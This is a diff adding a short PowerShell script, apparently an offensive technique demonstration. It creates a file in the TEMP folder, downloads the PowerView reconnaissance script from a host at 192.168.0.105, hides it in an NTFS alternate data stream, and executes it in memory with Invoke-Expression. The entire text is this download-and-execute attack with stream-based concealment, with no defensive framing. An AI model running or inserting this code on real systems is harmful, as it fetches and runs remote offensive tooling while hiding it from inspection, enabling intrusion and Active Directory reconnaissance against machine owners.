@@ -1,0 +1,8 @@
+﻿$file = "$env:TEMP\test.txt"
+Set-Content -Path $file -Value 'Alternate Data Stream Test File'
+Get-Content -Path $file
+Alternate Data Stream Test File
+
+$pvfile = Invoke-WebRequest -Uri http://192.168.0.105:8000/powerview.ps1
+Add-Content -Encoding Byte -Path $file -Value $pvfile.Content -Stream 'powerview'
+Invoke-Expression (Get-Content -Path $file -Stream 'powerview' -Raw)
